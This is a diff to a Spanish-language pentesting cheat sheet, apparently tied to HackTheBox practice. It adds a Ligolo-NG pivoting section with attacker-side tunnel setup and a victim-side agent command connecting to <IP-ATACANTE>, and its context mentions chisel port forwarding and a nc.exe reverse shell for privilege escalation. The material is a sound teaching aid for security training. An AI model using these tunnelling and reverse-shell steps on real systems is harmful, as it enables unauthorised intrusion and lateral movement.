@@ -108,7 +108,7 @@ Este programa explota el privilegio **SeImpersonatePrivilege** se puede comproba
 whoami /priv
 ```
 
-<img src="https://infiniteloginscom.files.wordpress.com/2020/12/image-42.png" width="50%" height="50%">
+<img src="https://infiniteloginscom.files.wordpress.com/2020/12/image-42.png" width="60%" height="60%">
 <br>
 Después subirás a la máquina víctima este archivo y nc.exe para realziar la Reverse Shell y obtener una Shell como Administrator, hay otros métodos de escalar, como por ejemplo crear un usuario y añadirlo al grupo Administrators.
 
@@ -170,6 +170,41 @@ Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, 
 ```
 ./chisel.exe client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
 ```
+
+## [Ligolo-NG](https://github.com/nicocha30/ligolo-ng/blob/master/README.md) 🔗
+
+Esta herramienta es MUCHO mejor que Chisel, con ella puedes hacer **PortForwarding** a todos los puertos de una interfaz interna de la máquina víctima.
+
+#### EJEMPLO
+La dirección IP interna de la víctima es 172.16.198.10 y quieres tener conectividad directa con esta IP y el resto de la red.
+
+#### MÁQUINA ATACANTE (Linux)
+```
+sudo ip tuntap add user <username-linux> mode tun ligolo
+sudo ip link set ligolo up
+ip route add 172.16.198.0/24 dev ligolo
+
+./proxy -selfcert
+```
+
+<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-interfaces.png" width="60%" height="60%"><br>
+
+#### MÁQUINA VÍCTIMA (Windows)
+```
+./agent.exe -connect <IP-ATACANTE>:11601 -ignore-cert
+```
+
+<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-victima.png" width="60%" height="60%"><br>
+
+#### MÁQUINA ATACANTE (Linux)
+```
+ligolo-ng » INFO[0037] Agent joined.                                 name="HTB\\svc-alfresco@FOREST" remote="10.10.10.161:53939"
+ligolo-ng » 
+ligolo-ng » session  # TIENES QUE ESCRIBIR 'session'.
+? Specify a session : 1 - HTB\svc-alfresco@FOREST - 10.10.10.161:53939  #  AQUÍ ESCRIBES '1'.
+```
+
+<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-session.png" width="60%" height="60%"><br>
 
 ## 🔗 Links
 [![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://katherineoelsner.com/)
